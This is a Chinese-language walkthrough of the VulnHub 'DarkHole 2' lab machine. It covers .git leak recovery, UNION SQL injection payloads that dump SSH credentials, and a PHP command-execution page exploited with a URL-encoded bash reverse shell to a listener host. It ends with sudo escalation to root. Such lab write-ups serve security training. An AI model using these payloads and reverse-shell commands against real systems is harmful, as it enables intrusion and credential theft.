25 Vulnhub Dark_Hole_2 Writeup

hdfzzf
2022-05-07 (Updated: 2022-05-07)
内网渗透
.bash_history, .git库泄露, SQL注入, vulnhub, 本地端口转发, 综合

该靶机作者给出的难度是高，但我认为达不到高难度。

1. 靶机信息

靶机地址：

  • DarkHole: 2 ~ VulnHub

难度：

  • 高（个人感觉达不到高难度）

目标：

  • 获得root权限
  • 拿到2个flag

攻击方法：

  • 主机发现
  • 端口扫描
  • 信息收集
  • .git库泄露
  • 源码分析
  • sql注入
  • 本地端口转发
  • 密码爆破
  • 权限提升

2. 渗透

2.1. 主机发现、端口扫描、端口服务发现

sudo arp-scan -l
sudo nmap -p- 192.168.100.22
sudo nmap -p22,80 -A 192.168.100.22

注意http服务上存在/.git/，以为着80端口可能有.git库泄露

2.2. 访问http服务

直接访问80端口，页面上只有一个功能点，那就是login，但是现在还不知道邮箱和密码。

将.git库下载到本地，直接使用wget，我利用githack得不到log消息。 

wget -r http://192.168.100.22/.git/ # r 递归下载

得到以IP命名的文件。 

cd 192.168.100.22
git log

因此，将版本会退回a4d9....，然后查看login.php 

git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10
cat login.php

从中找到了邮箱和密码： 

email: lush@admin.com
password: 321

2.3. get shell

然后回到登陆界面登录

注意到url中有一个id=1，先测试是否存在sql注入： 

?id=1' # 白屏
?id=1'--+ # 正常

因此存在SQL注入的漏洞，接下来就是常规的联合注入的过程。有一点不同的是，之前在判断字段数的时候，order by后面的数字和字段数不同都会错误，只有相同才不会出错。而该靶机当数字<=字段数的时候不出错，数字>字段数的时候出错

1. ?id=1' order by 6--+
2. ?id=-1' union select 1,2,3,4,5,6--+
3. ?id=-1' union select 1,user(),version(),4,@@basedir,database()--+
4. ?id=-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3,4,5,6--+
5. ?id=-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='ssh'),3,4,5,6--+
6. ?id=-1' union select 1,id,user,4,pass,6 from ssh--+

该数据库下还有其他信息，我都收集了，但是有用的就是ssh的账号和密码： 

username: jehad
password: fool

直接ssh远程连接： 

ssh jehad@192.168.100.22

2.4. 水平移动

首先查看用户： 

jehad@darkhole:~$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
lama:x:1000:1000:darkhole:/home/lama:/bin/bash
jehad:x:1001:1001:,,,:/home/jehad:/bin/bash
losy:x:1002:1002:,,,:/home/losy:/bin/bash

2.4.1. losy

进行了必要的收集之后，在/home/jehad/.bash_history中发现了重要的信息（节选） 

cd losy
cat authorized_keys
cat id_rsa
cat id_rsa.pub 
cat authorized_keys 
touch authorized_kyes
ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
curl "http://localhost:9999/?cmd=id"
...

原本以为losy可以利用公钥认证登录，但是被删除了。又注意到9999端口下可能存在着命令执行，因此查看该端口上执行的进程

/opt/web目录下有一个index.php，内容如下： 

<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>

很显然存在命令执行，于是我先尝试了/home/jehad/.bash_history里面的反弹shell的命令，但是行不通，于是使用如下命令： 

bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'

将其进行url编码

curl http://127.0.0.1:9999/?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27

2.4.2. lama

直接使用MidPwds.txt字典爆破即可

2.5. 权限提升

如果之前权限为losy，那么还是先检查/home/losy/.bash_history，注意到：

  1. 有一个密码 gang
  2. sudo -l
  3. 以及python反弹shell的命令

直接执行sudo -l，失败了，尝试ssh登录losy，密码为gang，成功！接着sudo -l

接下来就很简单了： 

sudo /usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

如果之前得到lama的权限，就更简单了。同样查看sudo -l

直接切换成root即可 

sudo su

最后，读取两个flag 

1. /home/losy/user.txt
DarkHole{'This_is_the_life_man_better_than_a_cruise'}

2. /root/root.txt
DarkHole{'Legend'}

3. 番外

其实在get shell的时候除了使用curl，还可以使用ssh，/home/jehad/.bash_history里面也涉及到了： 

ssh -L <localport>:<remotethost>:<remotepost> <hostname@ip>

本地转发：作用就是将本机的某个端口映射到远程主机的端口。这样远程主机就能通过对应的端口访问本机端口上的服务。

因此，该靶机中可以如此： 

kali: ssh -L 9999:localhost:9999 jehad@192.168.100.22

解释：对于靶机来说，kali就是远程主机。因为是在kali上运行该命令，于是remotethost = localhost。这样子，就能够在kali的9990端口上访问靶机的9999端口。

然后浏览器访问: 127.0.0.1:9999

直接输入： 

?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27

即可反弹shell。

4. 总结

对该靶机的渗透，有以下新的知识点：

  1. .git 泄露
  2. 利用ssh进行本地端口转发
  3. .bash_history一定要看！
